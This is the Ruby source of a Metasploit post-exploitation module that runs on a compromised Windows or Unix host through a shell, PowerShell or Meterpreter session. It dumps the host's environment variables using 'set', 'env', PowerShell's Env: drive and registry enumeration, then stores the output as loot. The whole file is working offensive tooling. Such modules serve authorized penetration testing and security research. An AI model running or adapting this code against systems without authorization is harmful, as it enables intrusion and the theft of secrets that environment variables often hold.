##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Gather Generic Operating System Environment Settings',
        'Description' => %q{ This module prints out the operating system environment variables. },
        'License' => MSF_LICENSE,
        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'egypt' ],
        'Platform' => %w[linux win unix],
        'SessionTypes' => %w[powershell shell meterpreter],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_config_getenv
              stdapi_sys_process_execute
            ]
          }
        }
      )
    )
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    output = case session.type
             when 'shell'
               get_env_shell
             when 'powershell'
               get_env_powershell
             when 'meterpreter'
               get_env_meterpreter
             end

    fail_with(Failure::Unknown, 'Could not retrieve environment variables') if output.blank?

    if session.platform == 'windows'
      ltype = 'windows.environment'
    else
      ltype = 'unix.environment'
    end

    print_line(output)
    path = store_loot(ltype, 'text/plain', session, output)
    print_good("Results saved to #{path}")
  end

  def get_env_shell
    cmd = session.platform == 'windows' ? 'set' : 'env'
    cmd_exec(cmd)
  end

  def get_env_powershell
    res = cmd_exec('Get-ChildItem Env: | ConvertTo-Csv')

    output = []
    csv = CSV.parse(res, skip_lines: /^#/, headers: true)
    csv.each do |row|
      output << "#{row['Key']}=#{row['Value']}"
    end

    return output.join("\n")
  end

  def get_env_meterpreter
    case session.platform
    when 'windows'
      var_names = []
      var_names << registry_enumvals('HKEY_CURRENT_USER\\Volatile Environment')
      var_names << registry_enumvals('HKEY_CURRENT_USER\\Environment')
      var_names << registry_enumvals('HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment')
      var_names.delete(nil)

      output = []
      session.sys.config.getenvs(*var_names.flatten.uniq.sort).each do |k, v|
        output << "#{k}=#{v}"
      end
      return output.join("\n")
    else
      # Don't know what it is, hope it's unix
      print_status("Executing 'env' on #{sysinfo['OS']}")
      chan = session.sys.process.execute('/bin/sh', '-c env', { 'Channelized' => true })
      return chan.read
    end
  end
end
